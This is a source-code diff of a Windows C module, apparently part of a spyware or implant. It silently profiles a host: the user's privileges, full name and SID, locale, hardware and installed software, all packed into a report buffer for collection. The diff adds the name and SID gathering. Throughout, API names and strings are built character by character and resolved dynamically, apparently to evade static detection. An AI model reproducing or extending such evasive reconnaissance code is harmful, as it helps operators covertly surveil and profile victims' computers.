@@ -124,21 +124,27 @@ VOID GetDeviceInfo()
 	CHAR strNetUserGetInfo[] = { 'N', 'e', 't', 'U', 's', 'e', 'r', 'G', 'e', 't', 'I', 'n', 'f', 'o', 0x0 };
 	NetUserGetInfo_p fpNetUserGetInfo = (NetUserGetInfo_p) GetProcAddress(LoadLibrary(L"Netapi32"), strNetUserGetInfo);
 	if (fpNetUserGetInfo)
-		if (fpNetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 1, &pUserInfo) == NERR_Success)
-			pDeviceInfo->userinfo.priv = ((PUSER_INFO_1)pUserInfo)->usri1_priv;		
-	
-	
+		if (fpNetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 4, &pUserInfo) == NERR_Success)
+		{
+			pDeviceInfo->userinfo.priv		= ((PUSER_INFO_4)pUserInfo)->usri4_priv;
+			//
+			wcsncpy_s(pDeviceInfo->userinfo.fullname, sizeof(pDeviceInfo->userinfo.fullname) / sizeof(WCHAR), ((PUSER_INFO_4)pUserInfo)->usri4_full_name, _TRUNCATE);
+
+			LPWSTR strSid;
+			if(ConvertSidToStringSid(((PUSER_INFO_4)pUserInfo)->usri4_user_sid, &strSid))				
+				wcsncpy_s(pDeviceInfo->userinfo.sid, sizeof(pDeviceInfo->userinfo.sid) / sizeof(WCHAR), strSid, _TRUNCATE);
+		}
+
 	CHAR strGetLocaleInfoW[] = { 'G', 'e', 't', 'L', 'o', 'c', 'a', 'l', 'e', 'I', 'n', 'f', 'o', 'W', 0x0 };
 	typedef ULONG (WINAPI *GETLOCALEINFO)(LCID, LCTYPE, LPWSTR, ULONG);
 	GETLOCALEINFO fpGetLocaleInfo = (GETLOCALEINFO) GetProcAddress(LoadLibrary(L"kernel32"), strGetLocaleInfoW);
 	// locale & timezone
-	
+
 	if (!fpGetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, pDeviceInfo->localinfo.lang, sizeof(pDeviceInfo->localinfo.lang) / sizeof(WCHAR)))
 		pDeviceInfo->localinfo.lang[0] = L'\0';
 	if (!fpGetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, pDeviceInfo->localinfo.country, sizeof(pDeviceInfo->localinfo.country) / sizeof(WCHAR)))
 		pDeviceInfo->localinfo.country[0] = L'\0';
-	
-			
+
 	LPWSTR strTimeZone = NULL;
 	if (bComAvailable)
 	{
@@ -192,14 +198,14 @@ VOID GetDeviceInfo()
 
 	DWORD dwSize =  sizeof(DEVICE_INFO) + (pApplicationList ? wcslen(pApplicationList) * sizeof(WCHAR) : 0 ) + (pApplicationList64 ? wcslen(pApplicationList64) * sizeof(WCHAR) : 0) + 1024;
 	
-	WCHAR str64[] = { L'6', L'4', L'b', L'i', L't', L'\0' };
-	WCHAR str32[] = { L'3', L'2', L'b', L'i', L't', L'\0' };
+	WCHAR str64[] = { L' ', L'(', L'6', L'4', L'b', L'i', L't', L')', L'\0' };
+	WCHAR str32[] = { L' ', L'(', L'3', L'2', L'b', L'i', L't', L')', L'\0' };
 	WCHAR strGuest[] = { L' ', L'[', L'G', L'U', L'E', L'S', L'T', L']', L'\0'};
 	WCHAR strAdmin[] = { L' ', L'[', L'A', L'D', L'M', L'I', L'N', L']', L'\0'};
 	WCHAR strFormat[] = { L'C', L'P', L'U', L':', L' ', L'%', L'd', L' ', L'x', L' ', L'%', L's', L'\n', L'A', L'r', L'c', L'h', L'i', L't', L'e', L'c', L't', L'u', L'r', L'e', L':', L' ', L'%', L's', L'\n', L'R', L'A', L'M', L':', L' ', L'%', L'd', L'M', L'B', L' ', L'f', L'r', L'e', L'e', L' ', L'/', L' ', L'%', L'd', L'M', L'B', L' ', L't', L'o', L't', L'a', L'l', L' ', L'(', L'%', L'u', L'%', L'%', L' ', L'u', L's', L'e', L'd', L')', L'\n', L'H', L'a', L'r', L'd', L'D', L'i', L's', L'k', L':', L' ', L'%', L'd', L'M', L'B', L' ', L'f', L'r', L'e', L'e', L' ', L'/', L' ', L'%', L'd', L'M', L'B', L' ', L't', L'o', L't', L'a', L'l', L'\n', L'\n', L'W', L'i', L'n', L'd', L'o', L'w', L's', L' ', L'V', L'e', L'r', L's', L'i', L'o', L'n', L':', L' ', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'\n', L'R', L'e', L'g', L'i', L's', L't', L'e', L'r', L'e', L'd', L' ', L't', L'o', L':', L' ', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L' ', L'{', L'%', L's', L'}', L'\n', L'L', L'o', L'c', L'a', L'l', L'e', L':', L' ', L'%', L's', L'_', L'%', L's', L' ', L'(', L'%', L's', L')', L'\n', L'\n', L'U', L's', L'e', L'r', L' ', L'I', L'n', L'f', L'o', L':', L' ', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'\n', L'S', L'I', L'D', L':', L' ', L'%', L's', L'\n', L'\n', L'A', L'p', L'p', L'l', L'i', L'c', L'a', L't', L'i', L'o', L'n', L' ', L'L', L'i', L's', L't', L' ', L'(', L'x', L'8', L'6', L')', L':', L'\n', L'%', L's', L'\n', L'A', L'p', L'p', L'l', L'i', L'c', L'a', L't', L'i', L'o', L'n', L'L', L'i', L's', L't', L' ', L'(', L'x', L'6', L'4', L')', L':', L'\n', L'%', L's', L'\0' };
 	WCHAR strUnknown[] = { L'U', L'N', L'K', L'N', L'O', L'W', L'N', L'\0' };
 
-	StringCbPrintf(pDeviceString, dwSize,	
+	StringCbPrintf(pDeviceString, dwSize,
 		//L"CPU: %d x %s\n"
 		//L"Architecture: %s\n"
 		//L"RAM: %dMB free / %dMB total (%u%% used)\n"
@@ -225,7 +231,6 @@ VOID GetDeviceInfo()
 		pDeviceInfo->userinfo.sid,
 		pApplicationList ? pApplicationList: L"",
 		pApplicationList64 ? pApplicationList64 : L"");
-	
 
 	pDeviceContainer = (PDEVICE_CONTAINER)malloc(sizeof(DEVICE_CONTAINER));
 	pDeviceContainer->pDataBuffer = (PBYTE)pDeviceString;
@@ -288,13 +293,14 @@ PWCHAR GetApplicationList(BOOL bX64View)
 				continue;
 
 			WCHAR strParentKeyName[] = { L'P', L'a', L'r', L'e', L'n', L't', L'K', L'e', L'y', L'N', L'a', L'm', L'e', L'\0' };
-			if (!RegQueryValueEx(hKeyProgram, strParentKeyName, NULL, NULL, NULL, NULL))
+			if (RegQueryValueEx(hKeyProgram, strParentKeyName, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
 				continue;
 
 			// no windows security essential without this.
-			WCHAR strSystemComponent[] = { L'S', L'y', L's', L't', L'e', L'm', L'C', L'o', L'm', L'p', L'o', L'n', L'e', L'n', L't', L'e', L'\0' };
+			//WCHAR strSystemComponent[] = { L'S', L'y', L's', L't', L'e', L'm', L'C', L'o', L'm', L'p', L'o', L'n', L'e', L'n', L't', L'e', L'\0' };
+			WCHAR strSystemComponent[] = { L'S', L'y', L's', L't', L'e', L'm', L'C', L'o', L'm', L'p', L'o', L'n', L'e', L'n', L't', L'\0' };
 			uLen = sizeof(ULONG);
-			if (!RegQueryValueEx(hKeyProgram, strSystemComponent, NULL, NULL, (PBYTE)&uVal, &uLen) && (uVal == 1))
+			if ((RegQueryValueEx(hKeyProgram, strSystemComponent, NULL, NULL, (PBYTE)&uVal, &uLen) == ERROR_SUCCESS) && (uVal == 1))
 				continue;
 
 			WCHAR strDisplayName[] = { L'D', L'i', L's', L'p', L'l', L'a', L'y', L'N', L'a', L'm', L'e', L'\0' };
@@ -303,7 +309,6 @@ PWCHAR GetApplicationList(BOOL bX64View)
 				continue;
 
 			wcsncpy_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), pStringValue, _TRUNCATE);
-
 
 			WCHAR strDisplayVersion[] = { L'D', L'i', L's', L'p', L'l', L'a', L'y', L'V', L'e', L'r', L's', L'i', L'o', 'n', L'\0' };
 			uLen = sizeof(pStringValue);
